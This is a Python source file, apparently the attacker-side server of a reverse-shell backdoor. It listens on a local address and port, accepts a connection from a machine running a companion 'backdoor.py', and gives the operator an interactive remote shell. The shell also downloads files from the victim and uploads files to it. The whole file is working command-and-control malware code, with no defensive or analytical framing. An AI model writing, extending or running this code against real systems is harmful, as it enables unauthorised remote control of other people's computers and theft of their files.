import os
import socket
import json

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())
    
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()#bytes
            return json.loads(data)
        except ValueError:
            continue
def upload_file(filename):
      f = open(filename,'rb') #read the file
      target.send(f.read())

def download_file(filename):
    f = open(filename,'wb') #write bytes 
    target.settimeout(1) #avoid complicatations during download
    chunk= target.recv(1024) #recieving bytes
    while chunk:      #runs while theres something in the chunk variable 
        f.write(chunk)
        try:
            chunk=target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def target_comm():
    while True:
        cmd = input('* Shell~%s: ' % str(ip))
        reliable_send(cmd)
        if cmd == 'exit':
            break
        elif cmd == 'clear':
            os.system('clear')
        elif cmd[:3] =='cd ': #directory changing checking for first 3 characters
            pass
        elif cmd[:8] == 'download':
            download_file(cmd[9:]) #download + filename(with empty space)
        elif cmd [:6] =='upload':
                upload_file(cmd[7:])   
        else:
            result = reliable_recv()
            print(result)
#backdoor.py runs on the target system,server.py will be downloading that file

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind(('192.168.1.58',5553))
print('[*] Listening for incoming connections')
sock.listen(5)
target, ip = sock.accept()
print('[*] Connection established w/: ' + str(ip))
target_comm() 


